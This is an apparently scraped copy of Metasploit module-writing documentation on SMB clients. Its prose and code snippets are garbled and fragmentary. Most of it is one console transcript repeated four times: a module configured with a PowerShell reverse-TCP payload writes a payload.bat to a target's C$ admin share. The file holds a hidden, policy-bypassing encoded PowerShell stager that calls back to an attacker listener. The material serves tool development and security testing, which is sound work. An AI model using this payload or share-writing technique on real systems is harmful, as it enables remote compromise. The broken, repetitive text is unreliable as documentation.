## SMB Protocol Overview
## Common SMB Packet Exchange Scenarios
## Module Writing
### Using the default MSF client
The following mixin will bring everything you need, including the main MSF SMB Client.
```ruby
register_options([
  OptString.new('SMBUser', [ false, 'The username to authenticate as', '']),
  OptString.new('SMBPass', [ false, 'The password for the specified username', '']),
  OptString.new('SMBDomain',  [ false, 'The Windows domain to use for authentication', '.']),
])
```

The first step is to initialize the client by invoking `connect`. The version(s) that will be negotiated can also be set up by passing an array to the keyword arguments versions. For example, to negotiate any dialect of SMB version 2 and 3, use this:
```msf
msf6 exploit(windows/smb/msf_smb_client_test) > options

Module options (exploit/windows/smb/msf_smb_client_test):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     172.16.60.128    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      445              yes       The SMB service port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    ABCDEFG          no        The password for the specified username
   SMBUser    smbuser          no        The username to authenticate as


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         172.16.60.1      yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/smb/msf_smb_client_test) > run

[*] Started reverse SSL handler on 172.16.60.1:4444
[*] 172.16.60.128:445 - Create and write to Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - Read Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - File content: powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAFzTKl8CA51WXW/bNhR996+48LRaQizCNroOCJBirpJuAbLWqLzlwTAQmrqOtcikR1L+QOL/XlKiLDlO0GV6sUVennvuuR/UTzASG5TznEMItzLVGjnMdvDJ/IxzyVHCO7ika4Q/qEx2rZaxZDoVHH5HHd7ijGUpcg2txxaYx9swuIAvuAm/zv5BpiEc71b4hS7RLGpi7KPCvjImfym8xDnNMx1JTMxOSjNlIDwtczxYjaTY7sgzC7PeWKlsW/ua4qoKrfUIxf6ISrr0y/+TWMuU30+9SCyXlCfd49VYZUzwZ4uXYsMzQZNiNXCYUjBUCpwAS5HkGVqCv/kBlCbpHPzKDYT4L7RnKU/aQbFZnivOZqky8hvJL4zLnfm/JFa1WLAH1IqM2erGWUzfm+f0IFGaSm39Os/FrkvRRcNuyBiutAEs0+GXVPav0ZW4RqnwlPEBupHyl5hHI+eo3f91QPofyIce6be7NgrnulXKp7REurRcS2hiyiwu1gzHml2ZnZKcrZS2S0aDmlJZXIG9wg5Zbip+R+LK1Hf+u97clBR2/UdvbND3EFIFk6Mz33ApNEYodTpPGdX4N83ShNq6i2iWzSh7mAbBC3TIMNcLW7T20FC9pEvQSF4tSB1QU7HJbKdxMp169teWXY+QQc88Tz8/9vZOVORJte1PNG41Qc5EYmv6/HwYR9fXgRX6k7Xx27emOMVGlZMhXmCWgcw5N9ZgZMiVKdA2nIGHfH1u37ht7zOzZjJy2GBiucp1vXnHI7HayfR+ocGPAhj0+r/AnymTQom5hkjIlZCFfASG1qO1VCDROFhjQu74HXf15zQhdlyhX0fX7XXrF3KD/F4vmkVTdW+zbE6q5m1STc6mcGMgrTau88mB59u5Vqc+C3lF2cJwLkEh5YfJUlvVtO3jHw3kgFTRlrOrQgqervlaPGB4tV0ZbZXR+4CyP+7ENynRGcXQMXkuWNwIVmQyICOqF2a187Hzv1O3WaQZ+r6XFj1QHv+GNPHLiu9Crwve0bkAQo7QO8ntlaWPydiE8tol5aaDNSFFiFcu5BrF9Di1VBpobkgVMlfhgJcGz8rKjASr5UkCIKyGbQk++PiuD0/wNddhiQpOiiOoARSCVMBG5B+kADo1yNYS8VBKISe96ZGzButin7AMqfSDlxhcNF9M429bp530n8qnhvlh6zRL5aRxqjOfs1wtDvevG4PuRokyodDFU9+IsRar6ho03xCtw7fDITnuEoTQXT52gHwHT7D+aT8JAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
[*] 172.16.60.128:445 - Delete Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] Exploit completed, but no session was created.
```

From Metasploit 6, the MSF client uses RubySMB under the hood by default for any SMB protocol version. For compatibility with older modules, it is still possible to force the client to use the original Rex SMB implementation. Note that this is **not recommended** and RubySMB should be the default for new modules. This can be done by explicitly negotiate SMB1 only (Rex only supports this version):
```msf
msf6 exploit(windows/smb/ruby_smb_client_test) > options

Module options (exploit/windows/smb/ruby_smb_client_test):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     172.16.60.128    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      445              yes       The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    ABCDEFG          no        The password for the specified username
   SMBUser    smbuser          no        The username to authenticate as


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         172.16.60.1      yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/smb/ruby_smb_client_test) > run

[*] Started reverse SSL handler on 172.16.60.1:4444
[*] 172.16.60.128:445 - Create and write to Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - Read Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - File content: powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAA3UKl8CA51WXW/bNhR996+48LRaQizCNroOCJBirpJuAbLWqLzlwTAQmrqOtcikR1L+QOL/XlKiLDlO0GV6sUVennvuuR/UTzASG5TznEMItzLVGjnMdvDJ/IxzyVHCO7ika4Q/qEx2rZaxZDoVHH5HHd7ijGUpcg2txxaYx9swuIAvuAm/zv5BpiEc71b4hS7RLGpi7KPCvjImfym8xDnNMx1JTMxOSjNlIDwtczxYjaTY7sgzC7PeWKlsW/ua4qoKrfUIxf6ISrr0y/+TWMuU30+9SCyXlCfd49VYZUzwZ4uXYsMzQZNiNXCYUjBUCpwAS5HkGVqCv/kBlCbpHPzKDYT4L7RnKU/aQbFZnivOZqky8hvJL4zLnfm/JFa1WLAH1IqM2erGWUzfm+f0IFGaSm39Os/FrkvRRcNuyBiutAEs0+GXVPav0ZW4RqnwlPEBupHyl5hHI+eo3f91QPofyIce6be7NgrnulXKp7REurRcS2hiyiwu1gzHml2ZnZKcrZS2S0aDmlJZXIG9wg5Zbip+R+LK1Hf+u97clBR2/UdvbND3EFIFk6Mz33ApNEYodTpPGdX4N83ShNq6i2iWzSh7mAbBC3TIMNcLW7T20FC9pEvQSF4tSB1QU7HJbKdxMp169teWXY+QQc88Tz8/9vZOVORJte1PNG41Qc5EYmv6/HwYR9fXgRX6k7Xx27emOMVGlZMhXmCWgcw5N9ZgZMiVKdA2nIGHfH1u37ht7zOzZjJy2GBiucp1vXnHI7HayfR+ocGPAhj0+r/AnymTQom5hkjIlZCFfASG1qO1VCDROFhjQu74HXf15zQhdlyhX0fX7XXrF3KD/F4vmkVTdW+zbE6q5m1STc6mcGMgrTau88mB59u5Vqc+C3lF2cJwLkEh5YfJUlvVtO3jHw3kgFTRlrOrQgqervlaPGB4tV0ZbZXR+4CyP+7ENynRGcXQMXkuWNwIVmQyICOqF2a187Hzv1O3WaQZ+r6XFj1QHv+GNPHLiu9Crwve0bkAQo7QO8ntlaWPydiE8tol5aaDNSFFiFcu5BrF9Di1VBpobkgVMlfhgJcGz8rKjASr5UkCIKyGbQk++PiuD0/wNddhiQpOiiOoARSCVMBG5B+kADo1yNYS8VBKISe96ZGzButin7AMqfSDlxhcNF9M429bp530n8qnhvlh6zRL5aRxqjOfs1wtDvevG4PuRokyodDFU9+IsRar6ho03xCtw7fDITnuEoTQXT52gHwHT7D+aT8JAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
[*] 172.16.60.128:445 - Delete Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] Exploit completed, but no session was created.
```

`

4. **File operations**

* read a file
`

` mode argument.

* write to a file
`

`

* delete a file
`

`: one or a list of comma-separated SMB protocol versions to negotiate (e.g. "1" or "1,2" or "2,3,1").
* `

`ruby
register_options([
  OptString.new('SMBUser', [ false, 'The username to authenticate as', '']),
  OptString.new('SMBPass', [ false, 'The password for the specified username', '']),
  OptString.new('SMBDomain',  [ false, 'The Windows domain to use for authentication', '.']),
])
`

`

Following the same workflow described above:

1. **Initialization**

* setup the dispatcher
`

`
* initialize the client
SMB versions 1, 2 and 3 will be negotiated by default. Use `

`

* read a file (see [RubySMB::SMB1::Tree](https://github.com/rapid7/ruby_smb/blob/a8af935d1f4b5fb57fc7c13490ca75bdacf032b9/lib/ruby_smb/smb1/tree.rb#L83) and [RubySMB::SMB2::Tree](https://github.com/rapid7/ruby_smb/blob/a8af935d1f4b5fb57fc7c13490ca75bdacf032b9/lib/ruby_smb/smb2/tree.rb#L67) for details)
`

`

* write to a file
`

`

* delete a file
`

`msf
msf6 exploit(windows/smb/msf_smb_client_test) > options

Module options (exploit/windows/smb/msf_smb_client_test):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     172.16.60.128    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      445              yes       The SMB service port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    ABCDEFG          no        The password for the specified username
   SMBUser    smbuser          no        The username to authenticate as


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         172.16.60.1      yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/smb/msf_smb_client_test) > run

[*] Started reverse SSL handler on 172.16.60.1:4444
[*] 172.16.60.128:445 - Create and write to Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - Read Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - File content: powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAFzTKl8CA51WXW/bNhR996+48LRaQizCNroOCJBirpJuAbLWqLzlwTAQmrqOtcikR1L+QOL/XlKiLDlO0GV6sUVennvuuR/UTzASG5TznEMItzLVGjnMdvDJ/IxzyVHCO7ika4Q/qEx2rZaxZDoVHH5HHd7ijGUpcg2txxaYx9swuIAvuAm/zv5BpiEc71b4hS7RLGpi7KPCvjImfym8xDnNMx1JTMxOSjNlIDwtczxYjaTY7sgzC7PeWKlsW/ua4qoKrfUIxf6ISrr0y/+TWMuU30+9SCyXlCfd49VYZUzwZ4uXYsMzQZNiNXCYUjBUCpwAS5HkGVqCv/kBlCbpHPzKDYT4L7RnKU/aQbFZnivOZqky8hvJL4zLnfm/JFa1WLAH1IqM2erGWUzfm+f0IFGaSm39Os/FrkvRRcNuyBiutAEs0+GXVPav0ZW4RqnwlPEBupHyl5hHI+eo3f91QPofyIce6be7NgrnulXKp7REurRcS2hiyiwu1gzHml2ZnZKcrZS2S0aDmlJZXIG9wg5Zbip+R+LK1Hf+u97clBR2/UdvbND3EFIFk6Mz33ApNEYodTpPGdX4N83ShNq6i2iWzSh7mAbBC3TIMNcLW7T20FC9pEvQSF4tSB1QU7HJbKdxMp169teWXY+QQc88Tz8/9vZOVORJte1PNG41Qc5EYmv6/HwYR9fXgRX6k7Xx27emOMVGlZMhXmCWgcw5N9ZgZMiVKdA2nIGHfH1u37ht7zOzZjJy2GBiucp1vXnHI7HayfR+ocGPAhj0+r/AnymTQom5hkjIlZCFfASG1qO1VCDROFhjQu74HXf15zQhdlyhX0fX7XXrF3KD/F4vmkVTdW+zbE6q5m1STc6mcGMgrTau88mB59u5Vqc+C3lF2cJwLkEh5YfJUlvVtO3jHw3kgFTRlrOrQgqervlaPGB4tV0ZbZXR+4CyP+7ENynRGcXQMXkuWNwIVmQyICOqF2a187Hzv1O3WaQZ+r6XFj1QHv+GNPHLiu9Crwve0bkAQo7QO8ntlaWPydiE8tol5aaDNSFFiFcu5BrF9Di1VBpobkgVMlfhgJcGz8rKjASr5UkCIKyGbQk++PiuD0/wNddhiQpOiiOoARSCVMBG5B+kADo1yNYS8VBKISe96ZGzButin7AMqfSDlxhcNF9M429bp530n8qnhvlh6zRL5aRxqjOfs1wtDvevG4PuRokyodDFU9+IsRar6ho03xCtw7fDITnuEoTQXT52gHwHT7D+aT8JAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
[*] 172.16.60.128:445 - Delete Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] Exploit completed, but no session was created.
`

`msf
msf6 exploit(windows/smb/ruby_smb_client_test) > options

Module options (exploit/windows/smb/ruby_smb_client_test):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     172.16.60.128    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      445              yes       The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    ABCDEFG          no        The password for the specified username
   SMBUser    smbuser          no        The username to authenticate as


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         172.16.60.1      yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/smb/ruby_smb_client_test) > run

[*] Started reverse SSL handler on 172.16.60.1:4444
[*] 172.16.60.128:445 - Create and write to Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - Read Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - File content: powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAA3UKl8CA51WXW/bNhR996+48LRaQizCNroOCJBirpJuAbLWqLzlwTAQmrqOtcikR1L+QOL/XlKiLDlO0GV6sUVennvuuR/UTzASG5TznEMItzLVGjnMdvDJ/IxzyVHCO7ika4Q/qEx2rZaxZDoVHH5HHd7ijGUpcg2txxaYx9swuIAvuAm/zv5BpiEc71b4hS7RLGpi7KPCvjImfym8xDnNMx1JTMxOSjNlIDwtczxYjaTY7sgzC7PeWKlsW/ua4qoKrfUIxf6ISrr0y/+TWMuU30+9SCyXlCfd49VYZUzwZ4uXYsMzQZNiNXCYUjBUCpwAS5HkGVqCv/kBlCbpHPzKDYT4L7RnKU/aQbFZnivOZqky8hvJL4zLnfm/JFa1WLAH1IqM2erGWUzfm+f0IFGaSm39Os/FrkvRRcNuyBiutAEs0+GXVPav0ZW4RqnwlPEBupHyl5hHI+eo3f91QPofyIce6be7NgrnulXKp7REurRcS2hiyiwu1gzHml2ZnZKcrZS2S0aDmlJZXIG9wg5Zbip+R+LK1Hf+u97clBR2/UdvbND3EFIFk6Mz33ApNEYodTpPGdX4N83ShNq6i2iWzSh7mAbBC3TIMNcLW7T20FC9pEvQSF4tSB1QU7HJbKdxMp169teWXY+QQc88Tz8/9vZOVORJte1PNG41Qc5EYmv6/HwYR9fXgRX6k7Xx27emOMVGlZMhXmCWgcw5N9ZgZMiVKdA2nIGHfH1u37ht7zOzZjJy2GBiucp1vXnHI7HayfR+ocGPAhj0+r/AnymTQom5hkjIlZCFfASG1qO1VCDROFhjQu74HXf15zQhdlyhX0fX7XXrF3KD/F4vmkVTdW+zbE6q5m1STc6mcGMgrTau88mB59u5Vqc+C3lF2cJwLkEh5YfJUlvVtO3jHw3kgFTRlrOrQgqervlaPGB4tV0ZbZXR+4CyP+7ENynRGcXQMXkuWNwIVmQyICOqF2a187Hzv1O3WaQZ+r6XFj1QHv+GNPHLiu9Crwve0bkAQo7QO8ntlaWPydiE8tol5aaDNSFFiFcu5BrF9Di1VBpobkgVMlfhgJcGz8rKjASr5UkCIKyGbQk++PiuD0/wNddhiQpOiiOoARSCVMBG5B+kADo1yNYS8VBKISe96ZGzButin7AMqfSDlxhcNF9M429bp530n8qnhvlh6zRL5aRxqjOfs1wtDvevG4PuRokyodDFU9+IsRar6ho03xCtw7fDITnuEoTQXT52gHwHT7D+aT8JAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
[*] 172.16.60.128:445 - Delete Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] Exploit completed, but no session was created.
`

